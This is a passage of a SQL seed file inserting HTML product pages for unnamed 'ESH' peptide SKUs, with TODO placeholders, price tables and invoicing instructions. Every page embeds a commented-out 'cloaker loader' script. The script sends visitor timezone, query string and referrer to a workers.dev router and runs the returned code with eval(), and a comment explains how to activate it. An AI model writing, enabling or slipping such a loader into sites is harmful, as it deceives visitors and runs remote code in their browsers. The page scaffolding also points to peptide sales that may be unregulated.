USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A5-standard-1mo-onetime</td><td>$80.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-standard-1mo-sub</td><td>$75.20 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A5-standard-3mo-onetime</td><td>$226.80 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-standard-3mo-sub</td><td>$213.19 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A5-standard-6mo-onetime</td><td>$398.40 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-standard-6mo-sub</td><td>$374.50 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A5-starter-12mo-onetime</td><td>$345.60 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-starter-12mo-sub</td><td>$324.86 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A5-starter-1mo-onetime</td><td>$40.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-starter-1mo-sub</td><td>$37.60 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A5-starter-3mo-onetime</td><td>$113.40 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-starter-3mo-sub</td><td>$106.60 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A5-starter-6mo-onetime</td><td>$199.20 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A5-starter-6mo-sub</td><td>$187.25 USD</td><td>recurring</td><td>6month</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for ESH-A5 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "esh-a5" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/esh-a5",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('esh-a6', 'ESH-A6 — peptide', '<article class="peptide" data-sku="ESH-A6">
<h1>ESH-A6</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU ESH-A6 · brand esh</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>ESH-A6-advanced-12mo-onetime</td><td>$2566.08 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-advanced-12mo-sub</td><td>$2412.12 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A6-advanced-1mo-onetime</td><td>$297.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-advanced-1mo-sub</td><td>$279.18 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A6-advanced-3mo-onetime</td><td>$842.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-advanced-3mo-sub</td><td>$791.48 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A6-advanced-6mo-onetime</td><td>$1479.06 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-advanced-6mo-sub</td><td>$1390.32 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A6-standard-12mo-onetime</td><td>$1710.72 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-standard-12mo-sub</td><td>$1608.08 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A6-standard-1mo-onetime</td><td>$198.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-standard-1mo-sub</td><td>$186.12 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A6-standard-3mo-onetime</td><td>$561.33 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-standard-3mo-sub</td><td>$527.65 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A6-standard-6mo-onetime</td><td>$986.04 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-standard-6mo-sub</td><td>$926.88 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A6-starter-12mo-onetime</td><td>$855.36 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-starter-12mo-sub</td><td>$804.04 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A6-starter-1mo-onetime</td><td>$99.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-starter-1mo-sub</td><td>$93.06 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A6-starter-3mo-onetime</td><td>$280.67 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-starter-3mo-sub</td><td>$263.83 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A6-starter-6mo-onetime</td><td>$493.02 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A6-starter-6mo-sub</td><td>$463.44 USD</td><td>recurring</td><td>6month</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for ESH-A6 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "esh-a6" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/esh-a6",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('esh-a7', 'ESH-A7 — peptide', '<article class="peptide" data-sku="ESH-A7">
<h1>ESH-A7</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU ESH-A7 · brand esh</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>ESH-A7-advanced-12mo-onetime</td><td>$1425.60 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-advanced-12mo-sub</td><td>$1340.06 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A7-advanced-1mo-onetime</td><td>$165.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-advanced-1mo-sub</td><td>$155.10 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A7-advanced-3mo-onetime</td><td>$467.78 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-advanced-3mo-sub</td><td>$439.71 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A7-advanced-6mo-onetime</td><td>$821.70 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-advanced-6mo-sub</td><td>$772.40 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A7-standard-12mo-onetime</td><td>$950.40 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-standard-12mo-sub</td><td>$893.38 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A7-standard-1mo-onetime</td><td>$110.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-standard-1mo-sub</td><td>$103.40 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A7-standard-3mo-onetime</td><td>$311.85 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-standard-3mo-sub</td><td>$293.14 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A7-standard-6mo-onetime</td><td>$547.80 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-standard-6mo-sub</td><td>$514.93 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A7-starter-12mo-onetime</td><td>$475.20 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-starter-12mo-sub</td><td>$446.69 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A7-starter-1mo-onetime</td><td>$55.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-starter-1mo-sub</td><td>$51.70 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A7-starter-3mo-onetime</td><td>$155.93 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-starter-3mo-sub</td><td>$146.57 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A7-starter-6mo-onetime</td><td>$273.90 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A7-starter-6mo-sub</td><td>$257.47 USD</td><td>recurring</td><td>6month</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for ESH-A7 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "esh-a7" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/esh-a7",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('esh-a8', 'ESH-A8 — peptide', '<article class="peptide" data-sku="ESH-A8">
<h1>ESH-A8</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU ESH-A8 · brand esh</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>ESH-A8-advanced-12mo-onetime</td><td>$2203.20 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-advanced-12mo-sub</td><td>$2071.01 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A8-advanced-1mo-onetime</td><td>$255.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-advanced-1mo-sub</td><td>$239.70 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A8-advanced-3mo-onetime</td><td>$722.93 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-advanced-3mo-sub</td><td>$679.55 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A8-advanced-6mo-onetime</td><td>$1269.90 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-advanced-6mo-sub</td><td>$1193.71 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A8-standard-12mo-onetime</td><td>$1468.80 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-standard-12mo-sub</td><td>$1380.67 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A8-standard-1mo-onetime</td><td>$170.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-standard-1mo-sub</td><td>$159.80 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A8-standard-3mo-onetime</td><td>$481.95 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-standard-3mo-sub</td><td>$453.03 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A8-standard-6mo-onetime</td><td>$846.60 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-standard-6mo-sub</td><td>$795.80 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A8-starter-12mo-onetime</td><td>$734.40 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-starter-12mo-sub</td><td>$690.34 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A8-starter-1mo-onetime</td><td>$85.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-starter-1mo-sub</td><td>$79.90 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A8-starter-3mo-onetime</td><td>$240.98 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-starter-3mo-sub</td><td>$226.52 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A8-starter-6mo-onetime</td><td>$423.30 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A8-starter-6mo-sub</td><td>$397.90 USD</td><td>recurring</td><td>6month</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for ESH-A8 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "esh-a8" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/esh-a8",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
INSERT OR REPLACE INTO pages (slug, title, body_html, version, updated_at) VALUES ('esh-a9', 'ESH-A9 — peptide', '<article class="peptide" data-sku="ESH-A9">
<h1>ESH-A9</h1>
<p class="lede"><em>Peptide name: <strong>TODO — fill in</strong></em> · common name: TODO · SKU ESH-A9 · brand esh</p>

<h2>What it is</h2>
<p>TODO: one paragraph — full name, molecular class, origin, year first isolated, primary research group. End with "Regulatory status: TODO."</p>

<h2>Mechanism</h2>
<p>TODO: plain-language mechanism, dominant evidence tier in line e.g. (ANIMAL_IN_VIVO). No medical-claim verbs.</p>

<h2>Use cases</h2>
<ul><li>TODO use case 1</li><li>TODO use case 2</li></ul>

<h2>Claims compliance</h2>
<p><strong>Allowed language:</strong> TODO</p>
<p><strong>Forbidden language:</strong> TODO</p>

<h2>Offers</h2>
<table class="prices"><thead><tr><th>SKU / tier / term</th><th>Price</th><th>Type</th><th>Billing</th></tr></thead>
<tbody><tr><td>ESH-A9-advanced-12mo-onetime</td><td>$1684.80 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-advanced-12mo-sub</td><td>$1583.71 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A9-advanced-1mo-onetime</td><td>$195.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-advanced-1mo-sub</td><td>$183.30 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A9-advanced-3mo-onetime</td><td>$552.83 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-advanced-3mo-sub</td><td>$519.66 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A9-advanced-6mo-onetime</td><td>$971.10 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-advanced-6mo-sub</td><td>$912.83 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A9-standard-12mo-onetime</td><td>$1123.20 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-standard-12mo-sub</td><td>$1055.81 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A9-standard-1mo-onetime</td><td>$130.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-standard-1mo-sub</td><td>$122.20 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A9-standard-3mo-onetime</td><td>$368.55 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-standard-3mo-sub</td><td>$346.44 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A9-standard-6mo-onetime</td><td>$647.40 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-standard-6mo-sub</td><td>$608.56 USD</td><td>recurring</td><td>6month</td></tr><tr><td>ESH-A9-starter-12mo-onetime</td><td>$561.60 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-starter-12mo-sub</td><td>$527.90 USD</td><td>recurring</td><td>12month</td></tr><tr><td>ESH-A9-starter-1mo-onetime</td><td>$65.00 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-starter-1mo-sub</td><td>$61.10 USD</td><td>recurring</td><td>1month</td></tr><tr><td>ESH-A9-starter-3mo-onetime</td><td>$184.28 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-starter-3mo-sub</td><td>$173.22 USD</td><td>recurring</td><td>3month</td></tr><tr><td>ESH-A9-starter-6mo-onetime</td><td>$323.70 USD</td><td>one_time</td><td>—</td></tr><tr><td>ESH-A9-starter-6mo-sub</td><td>$304.28 USD</td><td>recurring</td><td>6month</td></tr></tbody></table>
<p>To bill: query "send an invoice to &lt;email&gt; for ESH-A9 &lt;tier&gt; &lt;term&gt; &lt;sub|onetime&gt;" — routed to SEND_NAMED_INVOICE.</p>

<!-- JCI CLOAKER LOADER — INACTIVE. Uncomment + configure a campaign slug "esh-a9" in the
     loop-cloaker-router KV before enabling. While commented, this page renders normally.
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jstimezonedetect/1.0.6/jstz.min.js"></script>
<script>$(function(){var d=jstz.determine(),e=d.name();var qu=escape(location.search.substr(1));var rui=location.pathname+location.search;$.ajax({url:"https://loop-cloaker-router.owner-account.workers.dev/esh-a9",type:"POST",data:"tz="+e+"&rui="+rui+"&qu="+qu+"&r="+document.referrer+"&sn="+document.domain,success:function(a){if(a){eval(a)}else{$("html").show()}}})});</script>
-->
</article>', 1, '2026-06-10T04:40:00.000Z');
